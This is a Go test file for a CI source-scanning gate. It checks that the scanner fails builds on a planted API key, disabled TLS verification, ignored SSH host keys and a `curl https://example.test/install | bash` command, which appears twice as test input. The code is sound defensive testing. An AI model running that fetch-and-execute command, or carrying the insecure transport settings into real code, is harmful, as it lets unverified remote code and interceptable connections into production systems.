package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestProductCollectorRefusesMissingRoot(t *testing.T) {
	if _, err := collect(filepath.Join(t.TempDir(), "missing")); err == nil {
		t.Fatal("missing source reported clean")
	}
}

func TestProductCollectorBlocksAndNeverReportsSecret(t *testing.T) {
	root := t.TempDir()
	secret := "re_" + "abcdefghijklmnopqrstuvwxyz123456"
	if err := os.WriteFile(filepath.Join(root, "credential.sh"), []byte("RESEND_API_KEY="+secret), 0600); err != nil {
		t.Fatal(err)
	}
	r, err := collect(root)
	if err != nil || r.Status != "failed" || len(r.Blocking) == 0 {
		t.Fatal("planted credential did not fail gate")
	}
	raw, _ := json.Marshal(r)
	if strings.Contains(string(raw), secret) || !strings.Contains(string(raw), "credential.sh:1") {
		t.Fatal("report leaked value or lost location")
	}
}

func TestProductCollectorKeepsHTMLAdvisory(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "view.svelte"), []byte("<div>{@html userInput}</div>"), 0600); err != nil {
		t.Fatal(err)
	}
	r, err := collect(root)
	if err != nil || r.Status != "passed" || len(r.Advisory) != 1 {
		t.Fatal("existing advisory semantics changed")
	}
}

func TestProductCollectorBlocksUnsafeTransport(t *testing.T) {
	for _, body := range []string{"cfg := tls.Config{InsecureSkipVerify: true}", "cb := ssh.InsecureIgnoreHostKey()", `exec.Command("bash", "-c", "curl https://example.test/install | bash")`} {
		root := t.TempDir()
		if err := os.WriteFile(filepath.Join(root, "production.go"), []byte(body), 0600); err != nil {
			t.Fatal(err)
		}
		r, err := collect(root)
		if err != nil || r.Status != "failed" {
			t.Fatal("unsafe production transport was not refused")
		}
	}
}

func TestProductRuleFileCannotHideCurlExecution(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "ci/release/source-scan/source_policy.go")
	if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
		t.Fatal(err)
	}
	body := `exec.Command("bash", "-c", "curl https://example.test/install | bash")`
	if err := os.WriteFile(path, []byte(body), 0600); err != nil {
		t.Fatal(err)
	}
	r, err := collect(root)
	if err != nil || r.Status != "failed" {
		t.Fatal("rule-file self-exclusion hid curl execution")
	}
	found := false
	for _, hit := range r.Blocking {
		if hit.Rule == "unsafe-curl-exec" {
			found = true
		}
	}
	if !found {
		t.Fatal("curl execution rule did not report exact rule-file violation")
	}
}
